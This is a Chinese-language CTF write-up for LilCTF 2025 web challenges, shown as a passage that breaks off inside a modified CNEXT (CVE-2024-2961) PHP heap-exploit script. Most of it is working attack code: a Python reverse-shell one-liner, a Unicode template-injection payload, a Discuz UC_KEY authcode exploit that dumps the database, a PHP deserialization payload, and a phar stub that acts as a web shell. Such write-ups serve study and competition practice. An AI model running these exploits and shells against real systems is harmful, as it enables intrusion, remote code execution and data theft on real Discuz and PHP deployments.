# LilCTF 2025 Writeup by Team Volcania

## Web

### Ekko Note

数据库关系如下

![](https://assets.bili33.top/img/LilCTF2025-Writeup/ekko_note_database.PNG)

通过这里的注释，可以猜到题目大概与random伪随机有关系，如果拿到seed，就可以预测random生成的随机值

```python
# 欸我艹这两行代码测试用的忘记删了，欸算了都发布了，我们都在用力地活着，跟我的下班说去吧。
# 反正整个程序没有一个地方用到random库。应该没有什么问题。
import random
random.seed(SERVER_START_TIME)
```

题目提到的 RCE 相关代码

```python
@app.route('/execute_command', methods=['GET', 'POST'])
@login_required
def execute_command():
    result = check_time_api()
    if result is None:
        flash("API死了啦，都你害的啦。", "danger")
        return redirect(url_for('dashboard'))

    if not result:
        flash('2066年才完工哈，你可以穿越到2066年看看', 'danger')
        return redirect(url_for('dashboard'))

    if request.method == 'POST':
        command = request.form.get('command')
        os.system(command) # 什么？你说安全？不是，都说了还没完工催什么。
        return redirect(url_for('execute_command'))

    return render_template('execute_command.html')
```

通过访问 `/server_info` 能看到服务器启动时间

```json
{
    "current_time": 1755223998.0369895,
    "server_start_time": 1755223563.5477479
}
```

在忘记密码 `/forget_password` 里面，有 uuid v8

```python
@app.route('/forgot_password', methods=['GET', 'POST'])
def forgot_password():
    if request.method == 'POST':
        email = request.form.get('email')
        user = User.query.filter_by(email=email).first()
        if user:
            # 选哪个UUID版本好呢，好头疼 >_<
            # UUID v8吧，看起来版本比较新
            token = str(uuid.uuid8(a=padding(user.username))) # 可以自定义参数吗原来，那把username放进去吧
            reset_token = PasswordResetToken(user_id=user.id, token=token)
            db.session.add(reset_token)
            db.session.commit()
            # TODO：写一个SMTP服务把token发出去
            flash(f'密码恢复token已经发送，请检查你的邮箱', 'info')
            return redirect(url_for('reset_password'))
        else:
            flash('没有找到该邮箱对应的注册账户', 'danger')
            return redirect(url_for('forgot_password'))

    return render_template('forgot_password.html')

```

UUID v8 根据 random 算结果，印证前面猜想，所以忘记密码的重置 token 是可预测的

```python
import random
import uuid
from datetime import datetime

SERVER_START_TIME = 1755243162.2662387 # 服务器获取的开启时间
print(SERVER_START_TIME)

def padding(input_string):
    byte_string = input_string.encode('utf-8')
    if len(byte_string) > 6: byte_string = byte_string[:6]
    padded_byte_string = byte_string.ljust(6, b'\x00')
    padded_int = int.from_bytes(padded_byte_string, byteorder='big')
    return padded_int
random.seed(SERVER_START_TIME)
token = str(uuid.uuid8(a=padding('admin')))
print(token)
```

用生成的token来重置密码登录admin用户

![](https://assets.bili33.top/img/LilCTF2025-Writeup/8bf67c8c-33c3-41e8-971d-56ebb5a41501.png)

根据题目要求，年份大于 2066 年

```python
def check_time_api():
    user = User.query.get(session['user_id'])
    try:
        response = requests.get(user.time_api)
        data = response.json()
        datetime_str = data.get('date')
        if datetime_str:
            print(datetime_str)
            current_time = datetime.fromisoformat(datetime_str)
            return current_time.year >= 2066
    except Exception as e:
        return None
    return None
```

写个能够弹大于2066年的时间API，部署在 Vercel

```python
from fastapi import FastAPI
from fastapi.responses import JSONResponse

app = FastAPI()

@app.get("/time")
async def get_time():
    return JSONResponse(content={"date": "2077-01-01T00:00:00"})
```

```json
{
  "version": 2,
  "builds": [
    {
      "src": "api/index.py",
      "use": "@vercel/python"
    }
  ],
  "routes": [
    {
      "src": "/(.*)",
      "dest": "api/index.py"
    }
  ]
}
```

更换api后就能执行命令了

![](https://assets.bili33.top/img/LilCTF2025-Writeup/d3c62efa-585a-462b-92c1-25607da7c1d3.png)

然后就可以反弹shell了，注意/bin/bash是不存在的，要用/bin/sh

这里我用python -c来反弹shell

```bash
$ python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((host,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"
```

![](https://assets.bili33.top/img/LilCTF2025-Writeup/cd8de878-804f-484b-9e29-c25f498668b3.png)

### **ez_bottle**

黑名单如下

```python
BLACK_DICT = ["{", "}", "os", "eval", "exec", "sock", "<", ">", "bul", "class", "?", ":", "bash", "_", "globals","get", "open"]
```

题目会对上传的zip进行解压缩，然后读取文件并对文件内容进行模板渲染后输出

看到可以模板注入的地方，一开始想可能可以 `%include '/flag'`，可以绕过过滤条件

![](https://assets.bili33.top/img/LilCTF2025-Writeup/1c515ef3-d769-4cd8-abb3-59fa858c328b.png)

但是 `%include('/flag')` 返回

> Error rendering template: Warning: Use of deprecated feature or API. (Deprecated in Bottle-0.12) Cause: Use of absolute path for template name. Fix: Refer to templates with names or paths relative to the lookup path.

看来不行，尝试使用异形相近字符绕过，利用unicode编码标准化来实现绕过，因为在进行黑名单检测的时候这些字符还是异形的，在bottle渲染时会进行规范化，通过raise来显示flag，当然或许也可以写文件？

新建一个 `payload.txt` 文件

```
% import ºs
% flag=ºs.pºpen('cat /flag').read()
% raise Exception(flag)
```

压缩成 `payload.zip`，上传

```bash
$ curl -X POST -H "Content-Type: multipart/form-data" \ -F "file=@./payload.zip" http://challenge.xinshi.fun:45416/upload
```

### **我曾有一份工作**

能够看到是 Discuz X3.5，题目说本题允许使用扫描器，扫描一下目录

```
[15:57:37] 503 -    4KB - /.idea/workspace(2).xml
[15:57:37] 503 -    4KB - /.idea/workspace(4).xml
[15:57:37] 503 -    4KB - /.idea/workspace(3).xml
[15:57:37] 503 -    4KB - /.idea/workspace(5).xml
[15:57:37] 503 -    4KB - /.idea/workspace(7).xml
[15:57:37] 503 -    4KB - /.idea/workspace(6).xml
[16:00:27] 200 -    3KB - /admin.php
[16:02:40] 301 -  169B  - /api  ->  http://challenge.xinshi.fun/api/
[16:02:40] 200 -    1B  - /api/
[16:02:42] 200 -   13B  - /api.php
[16:02:59] 301 -  169B  - /archiver  ->  http://challenge.xinshi.fun/archiver/
[16:04:27] 301 -  169B  - /config  ->  http://challenge.xinshi.fun/config/
[16:04:32] 200 -    1B  - /config/
[16:04:56] 200 -  106B  - /crossdomain.xml
[16:05:02] 301 -  169B  - /data  ->  http://challenge.xinshi.fun/data/
[16:05:03] 200 -    0B  - /data/
[16:05:03] 200 -    0B  - /data/cache/
[16:06:10] 200 -    5KB - /favicon.ico
[16:06:48] 200 -    9KB - /group.php
[16:07:00] 200 -    9KB - /home.php
[16:07:28] 301 -  169B  - /install  ->  http://challenge.xinshi.fun/install/
[16:07:35] 200 -    9KB - /install/index.php?upgrade/
[16:07:35] 200 -    9KB - /install/
[16:08:47] 200 -    9KB - /member.php
[16:09:01] 200 -   33B  - /misc.php
[16:09:23] 503 -    4KB - /New%20folder%20(2)
[16:11:27] 200 -  639B  - /robots.txt
[16:11:40] 200 -    5KB - /search.php
[16:12:19] 301 -  169B  - /source  ->  http://challenge.xinshi.fun/source/
[16:12:19] 200 -    1B  - /source/
[16:12:32] 301 -  169B  - /static  ->  http://challenge.xinshi.fun/static/
[16:13:03] 301 -  169B  - /template  ->  http://challenge.xinshi.fun/template/
[16:13:03] 200 -    1B  - /template/
[16:14:50] 200 -   11MB - /www.zip
```

扫描到了备份文件 www.zip，结合题目描述，没错了，我们走在正确的方向上

发现配置文件里有各种硬编码的 key，微信找到一篇文章，可以通过 UC_KEY 实现导出数据库

https://mp.weixin.qq.com/s/IDkUpjPL0mzSxKOgldHPeQ

```php
define('UC_KEY', 'N8ear1n0q4s646UeZeod130eLdlbqfs1BbRd447eq866gaUdmek7v2D9r9EeS6vb');
```

整一个 exp

```php
<?php
$uc_key="N8ear1n0q4s646UeZeod130eLdlbqfs1BbRd447eq866gaUdmek7v2D9r9EeS6vb";

$a = 'time='.time().'&method=export&tableid=1$sqlpath=backup_2025&backupfilename=tid_1';
//$a = 'time='.time().'&method=list';
echo $code=urlencode(_authcode($a, 'ENCODE', $uc_key));
function _authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {    
    $ckey_length = 4;     
    $key = md5($key ? $key : UC_KEY);    
    $keya = md5(substr($key, 0, 16));   
    $keyb = md5(substr($key, 16, 16));    
    $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';     
    $cryptkey = $keya.md5($keya.$keyc);    
    $key_length = strlen($cryptkey);     
    $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;    
    $string_length = strlen($string);     
    $result = '';    
    $box = range(0, 255);     
    $rndkey = array();    
    for($i = 0; $i <= 255; $i++) {        
        $rndkey[$i] = ord($cryptkey[$i % $key_length]);    
    }     
    for($j = $i = 0; $i < 256; $i++) {     
        $j = ($j + $box[$i] + $rndkey[$i]) % 256; 
        $tmp = $box[$i];      
        $box[$i] = $box[$j];  
        $box[$j] = $tmp;    
    }     
    for($a = $j = $i = 0; $i < $string_length; $i++) {     
        $a = ($a + 1) % 256;     
        $j = ($j + $box[$a]) % 256;   
        $tmp = $box[$a];    
        $box[$a] = $box[$j];    
        $box[$j] = $tmp;      
        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));   
    }   
    if($operation == 'DECODE') {  
        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {     
            return substr($result, 26);      
        } else {          
            return '';       
        }    
    } else { 
        return $keyc.str_replace('=', '', base64_encode($result)); 
    } 
}
?>
```

GET数据包，填入`code`导出数据库操作

```
GET /api/db/dbbak.php?apptype=discuzx&code=80fb%2B20Q3V%2FYQpzvnEf9xgesEZx0RCRojkNvhQMASf0VXsPoDrf1fpbZDAusut%2BNuNbot53kG9V%2FWcB4%2FlX8TJufryMkiNjDR%2F3kr6HggkcGAMNwwwQN4CxKY7UQhty5LFsirhvC9675h8Q72w
 HTTP/1.1
Host: challenge.xinshi.fun:*****
Accept-Language: zh-CN,zh;q=0.9
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Cookie: j2pU_2132_saltkey=cip55Vvg; j2pU_2132_lastvisit=1755332286; j2pU_2132__refer=%252Fhome.php%253Fmod%253Dspacecp%2526ac%253Dcredit%2526showcredit%253D1; j2pU_2132_seccodecSAmPeT04h59=15.9ae6a76ce20e8fa0f9; j2pU_2132_sid=o6B7bZ; j2pU_2132_lastact=1755338785%09uc.php%09; j2pU_2132_auth=a541vV4igyZgMv4jVwlL5WEuXNNJMM3HIeGOWb%2Bzn%2BGvxug5KOyPPxnUzd8NOsPCtaHEKIrejQ3hoDbqm0eA
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
```

导出了几个 sql 文件发现 `tableid` 是以表名字典序排序的，所以 `pre_a_flag` 在最前面，直接传入 tableid=1 构造 code

![](https://assets.bili33.top/img/LilCTF2025-Writeup/1ad6fa30-9e77-4a20-b596-815ac4fbcb1f.png)

```php
# Identify: MTc1NTM0MTMzNCxYMy41LGRpc2N1engsbXVsdGl2b2wsMQ==
# <?php exit();?>
# discuzx Multi-Volume Data Dump Vol.1
# Time: 2025-08-16 10:48:54
# Type: discuzx
# Table Prefix: pre_
# utf8mb4
# discuzx Home: https://www.discuz.vip
# Please visit our website for newest infomation about discuzx
# --------------------------------------------------------

INSERT INTO pre_a_flag VALUES ('1',0x666c61677b746573745f666c61677d);
INSERT INTO pre_a_flag VALUES ('2',0x4c494c4354467b486176455f596f555f3130756e645f345f4a4f625f4e30773f5f4841486148417d);
```

![](https://assets.bili33.top/img/LilCTF2025-Writeup/image-20250818000151573.png)

### **Your Uns3r**

```php
<?php

class User{
    public $username=0;
    public $value;
}

class Access{
    // 利用 getToken() 的两次序列化与反序列化
    // 让 'lilctf' 夹在中间：'/' . 'lilctf' . '/../flag' => /flag
    protected $prefix = 'php://filter/convert.base64-encode/resource=/';
    protected $suffix = '/../flag';
}

$a=new Access();
$u=new User();
// value 放“序列化后的 Access 字符串”
$u->value=serialize($a);

// throw new Exception("nonono!!!");
// 会使php直接退出，__destruct也不会执行，需要在这之前触发__destruct
// 这里用一个array包含两个index=0的值，第一个是我们的payload，第二个是null
// 反序列化时会先把我们的payload反序列化出来，然后null会覆盖我们的payload，此时会触发__destruct
$payload=serialize(array($u,null));
$payload = str_replace('i:1', 'i:0', $payload);
echo $payload.'<br />';
echo urlencode($payload).'<br />';
```

![](https://assets.bili33.top/img/LilCTF2025-Writeup/0856ece7-61ca-4d95-b980-f1ae41da333f.png)

### **php_jail_is_my_cry**

PHP版本为8.3.0

发现题目对halt这个字符串进行了检查，那么可能正是要绕过这个字符串来实现某些操作

果不其然，找到一篇文章：https://blog.csdn.net/MrWangisgoodboy/article/details/130146658

![](https://assets.bili33.top/img/LilCTF2025-Writeup/913857e1-4711-41b1-97c6-4941343d6db2.png)

通过文件包含gzip压缩后的phar文件的反序列化，可以实现运行任意PHP代码

找到一篇文章有讲解这个问题的：

原理：https://mp.weixin.qq.com/s/8Fs4nSTvrSyBW6wlePxbTg

写个 `genphar.php`

```php
<?php
$phar = new Phar("payload.phar");
$phar->compressFiles(Phar::GZ);
$phar->startBuffering();
#$p->setStub("<?php \$ch = curl_init('file://aa.txt');curl_setopt(\$ch, CURLOPT_RETURNTRANSFER, true);\$data = curl_exec(\$ch);curl_close(\$ch);echo \$data; __HALT_COMPILER();");
$phar->setStub('
<?php 
if (isset($_REQUEST["file"])){
    $a = $_REQUEST["file"];
    echo "File contents: ";
    $ch = curl_init($a);
    curl_setopt($ch, CURLOPT_PROTOCOLS_STR, "all");
    curl_exec($ch);curl_close($ch);

}

if (isset($_REQUEST["input"])){
    $data = $_REQUEST["input"];
    $target_file="/tmp/io";
    file_put_contents($target_file, $data);
    #echo $data;
    #include $target_file;
}

if (isset($_REQUEST["include"])){
    $b = $_REQUEST["include"];
    echo "include: ";
    include $b;
}
    
;__HALT_COMPILER();
');
$phar->addFromString("rubbish", "AAAAAAAAAAA");
$phar->stopBuffering();
?>
```

用下面的命令生成通过gz绕过

```bash
$ php -d phar.readonly=0 genphar.php
$ gzip -c payload.phar > payload.phar.gz
#docker cp ./payload.phar.gz d3aa352543c1:/tmp
```

题目有个提示： ` // I hide a trick to bypass open_basedir, I'm sure you can find it.`

猜测利用点可能在附近，大概率就是cURL

果不其然，我搜索关键词cURL open_basedir 8.3，第一个就是

![](https://assets.bili33.top/img/LilCTF2025-Writeup/7df115eb-9c37-4349-92a3-0aa684a89c31.png)

可以通过file://来读文件，flag果然读不了，/etc/passwd和/proc/self/maps可以读

那么接下来应该就是打cnext漏洞了，php 8.3.0应该可以打

https://jishuzhan.net/article/1955857830778548226

需要将原本exp改掉，应为data://协议在allow_url_include没有开启的情况下是不能使用的，那么就要将resource=指向/tmp目录下的文件

同时file_put_content没有被禁用，可以写文件到/tmp再用php://filter通过filterchain读文件打cnext

这里我统一写文件到/tmp/io，再读取，来实现对resource的内容控制

url传入 `http://challenge.xinshi.fun:*****/?down=payload.phar.gz`

找了个比较丑陋的 exp，但是能跑

```python
#!/usr/bin/env python3
#
# CNEXT: PHP file-read to RCE (CVE-2024-2961)
# Date: 2024-05-27
# Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)
#
# TODO Parse LIBC to know if patched
#
# INFORMATIONS
#
# To use, implement the Remote class, which tells the exploit how to send the payload.
#

from __future__ import annotations

import base64
import zlib

from dataclasses import dataclass
from requests.exceptions import ConnectionError, ChunkedEncodingError

from pwn import *
from ten import *
from ten import entry

HEAP_SIZE = 2 * 1024 * 1024
BUG = "劄".encode("utf-8")


class Remote:
    """A helper class to send the payload and download files.
    
    The logic of the exploit is always the same, but the exploit needs to know how to
    download files (/proc/self/maps and libc) and how to send the payload.
    
    The code here serves as an example that attacks a page that looks like:
    
    ```php
    <?php
    
    $data = file_get_contents($_POST['file']);
    echo "File contents: $data";
    Tweak it to fit your target, and start the exploit.
    """
    
    def __init__(self, url: str) -> None:
        self.url = url
        self.session = Session()
    
    def send(self, path: str) -> Response:
        """Sends given `path` to the HTTP server. Returns the response.
        """
        #print(self.url)
        return self.session.post(self.url, data={"file": path})
    
    def download(self, path: str) -> bytes:
        """Returns the contents of a remote file.
        """
        
        #path = f"php://filter/convert.base64-encode/resource={path}"
        path = f"file://{path}"
        response = self.session.post(self.url, data={"file": path})
        #print("=====================")
        print(path)
        #print(f"Text:{response.text}")
        data = response.re.search(b"File contents: (.*)", flags=re.S).group(1)
        #return base64.decode(data)
        return data
    def include(self, path: str) -> bytes:
        response = self.session.post(self.url, data={"include": path})
        #print("========")
        #print(f"res:{response.content}")
        try:
            data = response.re.search(b"include: (.*)", flags=re.S).group(1)
            #print(path)
            #print(response.text)
            return data.decode()
        except AttributeError:
            print("按寻思这玩意能跑")
            return None
        pass


    def dataio(self,data: str) -> None:
        response = self.session.post(self.url, data={"input": data})
        pass


@entry
@arg("url", "Target URL")
@arg("command", "Command to run on the system; limited to 0x140 bytes")
@arg("sleep", "Time to sleep to assert that the exploit worked. By default, 1.")
@arg("heap", "Address of the main zend_mm_heap structure.")
@arg(
    "pad",
    "Number of 0x100 chunks to pad with. If the website makes a lot of heap "
    "operations with this size, increase this. Defaults to 20.",
)
@dataclass
class Exploit:
    """CNEXT exploit: RCE using a file read primitive in PHP."""

    url: str
    command: str
    sleep: int = 1
    heap: str = None
    pad: int = 20
    
    def __post_init__(self):
        self.remote = Remote(self.url)
        self.log = logger("EXPLOIT")
        self.info = {}
        self.heap = self.heap and int(self.heap, 16)
    
    def check_vulnerable(self) -> None:
        """Checks whether the target is reachable and properly allows for the various
        wrappers and filters that the exploit needs.
        """
        
        def safe_download(path: str) -> bytes:
            try:
                return self.remote.download(path)
            except ConnectionError:
                failure("Target not [b]reachable[/] ?")


        def check_token(text: str, path: str) -> bool:
            self.remote.dataio(text)
            #print(f"text:{text}")
            result = self.remote.include(path)
            print(path)
            print(f"result:{result}")
            #return text.encode() == result
            return text == result
    
        text = tf.random.string(50).encode()
        base64 = b64(text, misalign=True).decode()
        #path = f"data:text/plain;base64,{base64}"####################################
        path = f"{base64}"
        #result = safe_download(path)
        '''
        if text not in result:
            msg_failure("Remote.download did not return the test string")
            print("--------------------")
            print(f"Expected test string: {text}")
            print(f"Got: {result}")
            print("--------------------")
            failure("If your code works fine, it means that the [i]data://[/] wrapper does not work")
    
        msg_info("The [i]data://[/] wrapper works")
    
        text = tf.random.string(50)
        base64 = b64(text.encode(), misalign=True).decode()
        path = f"php://filter//resource=data:text/plain;base64,{base64}"
        if not check_token(text, path):
            failure("The [i]php://filter/[/] wrapper does not work")
    
        msg_info("The [i]php://filter/[/] wrapper works")
    
        text = tf.random.string(50)
        base64 = b64(compress(text.encode()), misalign=True).decode()
        path = f"php://filter/zlib.inflate/resource=data:text/plain;base64,{base64}"
    
        if not check_token(text, path):
            failure("The [i]zlib[/] extension is not enabled")
    
        msg_info("The [i]zlib[/] extension is enabled")
    
        msg_success("Exploit preconditions are satisfied")
    '''
        text = tf.random.string(50)
        base64 = b64(text.encode(), misalign=True).decode()
        path = f"php://filter//resource=/tmp/io"
        #if not check_token(base64, path):
            #failure("The [i]php://filter/[/] wrapper does not work")
    
        #msg_info("The [i]php://filter/[/] wrapper works")


        text = tf.random.string(50)
        print(f"text: {text}")
        compressed =compress(text.encode())
        base64 = b64(compress(text.encode()), misalign=True).decode()
        path = f"php://filter/zlib.inflate/resource=/tmp/io"
        #if not check_token(compressed, path):
            #failure("The [i]zlib[/] extension is not enabled")
    
        #msg_info("The [i]zlib[/] extension is enabled")
    
        msg_success("Exploit preconditions are satisfied")
    
    def get_file(self, path: str) -> bytes:
        with msg_status(f"Downloading [i]{path}[/]..."):
            return self.remote.download(path)
    
    def get_regions(self) -> list[Region]:
        """Obtains the memory regions of the PHP process by querying /proc/self/maps."""
        maps = self.get_file("/proc/self/maps")
        maps = maps.decode()
        PATTERN = re.compile(
            r"^([a-f0-9]+)-([a-f0-9]+)\b" r".*" r"\s([-rwx]{3}[ps])\s" r"(.*)"
        )
        regions = []
        for region in table.split(maps, strip=True):
            if match := PATTERN.match(region):
                start = int(match.group(1), 16)
                stop = int(match.group(2), 16)
                permissions = match.group(3)
                path = match.group(4)
                if "/" in path or "[" in path:
                    path = path.rsplit(" ", 1)[-1]
                else:
                    path = ""
                current = Region(start, stop, permissions, path)
                regions.append(current)
            else:
                print(maps)
                failure("Unable to parse memory mappings")
    
        self.log.info(f"Got {len(regions)} memory regions")
    
        return regions
    
    def get_symbols_and_addresses(self) -> None:
        """Obtains useful symbols and addresses from the file read primitive."""
        regions = self.get_regions()
    
        LIBC_FILE = "/dev/shm/cnext-libc"
    
        # PHP's heap
    
        self.info["heap"] = self.heap or self.find_main_heap(regions)
    
        # Libc
    
        libc = self._get_region(regions, "libc-", "libc.so")
    
        self.download_file(libc.path, LIBC_FILE)
    
        self.info["libc"] = ELF(LIBC_FILE, checksec=False)
        self.info["libc"].address = libc.start
    
    def _get_region(self, regions: list[Region], *names: str) -> Region:
        """Returns the first region whose name matches one of the given names."""
        for region in regions:
            if any(name in region.path for name in names):
                break
        else:
            failure("Unable to locate region")
    
        return region
    
    def download_file(self, remote_path: str, local_path: str) -> None:
        """Downloads `remote_path` to `local_path`"""
        data = self.get_file(remote_path)
        Path(local_path).write(data)
    
    def find_main_heap(self, regions: list[Region]) -> Region:
        # Any anonymous RW region with a size superior to the base heap size is a
        # candidate. The heap is at the bottom of the region.
        heaps = [
            region.stop - HEAP_SIZE + 0x40
            for region in reversed(regions)
            if region.permissions == "rw-p"
            and region.size >= HEAP_SIZE
            and region.stop & (HEAP_SIZE-1) == 0
            and region.path in ("", "[anon:zend_alloc]")
        ]
    
        if not heaps:
            failure("Unable to find PHP's main heap in memory")
    
        first = heaps[0]
    
        if len(heaps) > 1:
            heaps = ", ".join(map(hex, heaps))
            msg_info(f"Potential heaps: [i]{heaps}[/] (using first)")
        else:
            msg_info(f"Using [i]{hex(first)}[/] as heap")
    
        return first
    
    def run(self) -> None:
        self.check_vulnerable()
        self.get_symbols_and_addresses()
        self.exploit()
    
    def build_exploit_path(self) -> str:
        print("wwwwwwwwwwwwwwwww")
        """On each step of the exploit, a filter will process each chunk one after the
        other. Processing generally involves making some kind of operation either
        on the chunk or in a destination chunk of the same size. Each operation is
        applied on every single chunk; you cannot make PHP apply iconv on the first 10
        chunks and leave the rest in place. That's where the difficulties come from.
    
        Keep in mind that we know the address of the main heap, and the libraries.
        ASLR/PIE do not matter here.
    
        The idea is to use the bug to make the freelist for chunks of size 0x100 point
        lower. For instance, we have the following free list:
    
        ... -> 0x7fffAABBCC900 -> 0x7fffAABBCCA00 -> 0x7fffAABBCCB00
    
        By triggering the bug from chunk ..900, we get:
    
        ... -> 0x7fffAABBCCA00 -> 0x7fffAABBCCB48 -> ???
    
        That's step 3.
    
        Now, in order to control the free list, and make it point whereever we want,
        we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,
        we'd have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.
        That's step 2.
    
        Now, if we were to perform step2 an then step3 without anything else, we'd have
        a problem: after step2 has been processed, the free list goes bottom-up, like:
    
        0x7fffAABBCCB00 -> 0x7fffAABBCCA00 -> 0x7fffAABBCC900
    
        We need to go the other way around. That's why we have step 1: it just allocates
        chunks. When they get freed, they reverse the free list. Now step2 allocates in
        reverse order, and therefore after step2, chunks are in the correct order.
    
        Another problem comes up.
    
        To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.
        Since step2 creates chunks that contain pointers and pointers are generally not
        UTF-8, we cannot afford to have that conversion happen on the chunks of step2.
        To avoid this, we put the chunks in step2 at the very end of the chain, and
        prefix them with `0\n`. When dechunked (right before the iconv), they will
        "disappear" from the chain, preserving them from the character set conversion
        and saving us from an unwanted processing error that would stop the processing
        chain.
    
        After step3 we have a corrupted freelist with an arbitrary pointer into it. We
        don't know the precise layout of the heap, but we know that at the top of the
        heap resides a zend_mm_heap structure. We overwrite this structure in two ways.
        Its free_slot[] array contains a pointer to each free list. By overwriting it,
        we can make PHP allocate chunks whereever we want. In addition, its custom_heap
        field contains pointers to hook functions for emalloc, efree, and erealloc
        (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and
        then overwrite the use_custom_heap flag to make PHP use these function pointers
        instead. We can now do our favorite CTF technique and get a call to
        system(<chunk>).
        We make sure that the "system" command kills the current process to avoid other
        system() calls with random chunk data, leading to undefined behaviour.
    
        The pad blocks just "pad" our allocations so that even if the heap of the
        process is in a random state, we still get contiguous, in order chunks for our
        exploit.
    
        Therefore, the whole process described here CANNOT crash. Everything falls
        perfectly in place, and nothing can get in the middle of our allocations.
        """
    
        LIBC = self.info["libc"]
        ADDR_EMALLOC = LIBC.symbols["__libc_malloc"]
        ADDR_EFREE = LIBC.symbols["__libc_system"]
        ADDR_EREALLOC = LIBC.symbols["__libc_realloc"]
    
        ADDR_HEAP = self.info["heap"]
        ADDR_FREE_SLOT = ADDR_HEAP + 0x20
        ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168
    
        ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10
    
        CS = 0x100
    
        # Pad needs to stay at size 0x100 at every step
        pad_size = CS - 0x18
        pad = b"\x00" * pad_size
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = compressed_bucket(pad)
    
        step1_size = 1
        step1 = b"\x00" * step1_size
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1, CS)
        step1 = compressed_bucket(step1)
    
        # Since these chunks contain non-UTF-8 chars, we cannot let it get converted to
        # ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk "crash"
    
        step2_size = 0x48
        step2 = b"\x00" * (step2_size + 8)
        step2 = chunked_chunk(step2, CS)
        step2 = chunked_chunk(step2)
        step2 = compressed_bucket(step2)
    
        step2_write_ptr = b"0\n".ljust(step2_size, b"\x00") + p64(ADDR_FAKE_BIN)
        step2_write_ptr = chunked_chunk(step2_write_ptr, CS)
        step2_write_ptr = chunked_chunk(step2_write_ptr)
        step2_write_ptr = compressed_bucket(step2_write_ptr)
    
        step3_size = CS
    
        step3 = b"\x00" * step3_size
        assert len(step3) == CS
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = compressed_bucket(step3)
    
        step3_overflow = b"\x00" * (step3_size - len(BUG)) + BUG
        assert len(step3_overflow) == CS
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = compressed_bucket(step3_overflow)
    
        step4_size = CS
        step4 = b"=00" + b"\x00" * (step4_size - 1)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = compressed_bucket(step4)
    
        # This chunk will eventually overwrite mm_heap->free_slot
        # it is actually allocated 0x10 bytes BEFORE it, thus the two filler values
        step4_pwn = ptr_bucket(
            0x200000,
            0,
            # free_slot
            0,
            0,
            ADDR_CUSTOM_HEAP,  # 0x18
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            ADDR_HEAP,  # 0x140
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            size=CS,
        )
    
        step4_custom_heap = ptr_bucket(
            ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18
        )
    
        step4_use_custom_heap_size = 0x140
    
        COMMAND = self.command
        COMMAND = f"kill -9 $PPID; {COMMAND}"
        if self.sleep:
            COMMAND = f"sleep {self.sleep}; {COMMAND}"
        COMMAND = COMMAND.encode() + b"\x00"
    
        assert (
            len(COMMAND) <= step4_use_custom_heap_size
        ), f"Command too big ({len(COMMAND)}), it must be strictly inferior to {hex(step4_use_custom_heap_size)}"
        COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b"\x00")
    
        step4_use_custom_heap = COMMAND
        step4_use_custom_heap = qpe(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)
    
        pages = (
            step4 * 3
            + step4_pwn
            + step4_custom_heap
            + step4_use_custom_heap
            + step3_overflow
            + pad * self.pad
            + step1 * 3
            + step2_write_ptr
            + step2 * 2
        )
    
        resource = compress(compress(pages))
        #resource = b64(resource)
        #resource = f"data:text/plain;base64,{resource.decode()}"
        #resource = f"{resource.decode()}"
        filters = [
            # Create buckets
            "zlib.inflate",
            "zlib.inflate",
            
            # Step 0: Setup heap
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 1: Reverse FL order
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 2: Put fake pointer and make FL order back to normal
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 3: Trigger overflow
            "dechunk",
            "convert.iconv.UTF-8.ISO-2022-CN-EXT",
            
            # Step 4: Allocate at arbitrary address and change zend_mm_heap
            "convert.quoted-printable-decode",
            "convert.iconv.L1.L1",
        ]
        filters = "|".join(filters)
    
        path = f"php://filter/read={filters}/resource=/tmp/io"
    
        return path,resource
    
    @inform("Triggering...")
    def exploit(self) -> None:
        path,resource = self.build_exploit_path()
        start = time.time()
    
        try:
            #print(resource)
